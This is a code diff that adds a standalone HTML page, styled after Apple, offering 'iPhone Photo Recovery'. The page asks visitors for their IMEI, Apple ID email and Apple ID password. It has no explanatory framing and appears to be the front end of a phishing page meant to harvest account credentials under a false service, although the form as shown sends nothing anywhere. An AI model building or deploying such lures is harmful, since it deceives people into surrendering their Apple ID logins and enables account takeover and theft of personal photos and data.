@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>iPhone Photo Recovery</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      width: 90%;
+      max-width: 400px;
+    }
+    h2 {
+      color: #007aff;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    label {
+      font-weight: bold;
+      margin-top: 15px;
+      display: block;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+    }
+    button {
+      width: 100%;
+      margin-top: 20px;
+      background-color: #007aff;
+      color: white;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #005fcc;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h2>iPhone Photo Recovery</h2>
+    <form>
+      <label for="imei">Enter IMEI Number:</label>
+      <input type="text" id="imei" name="imei" placeholder="e.g. 356789123456789" required>
+
+      <label for="email">Apple ID Email:</label>
+      <input type="email" id="email" name="email" placeholder="example@icloud.com" required>
+
+      <label for="password">Apple ID Password:</label>
+      <input type="password" id="password" name="password" placeholder="••••••••" required>
+
+      <button type="submit">Recover Photos</button>
+    </form>
+  </div>
+
+</body>
+</html>
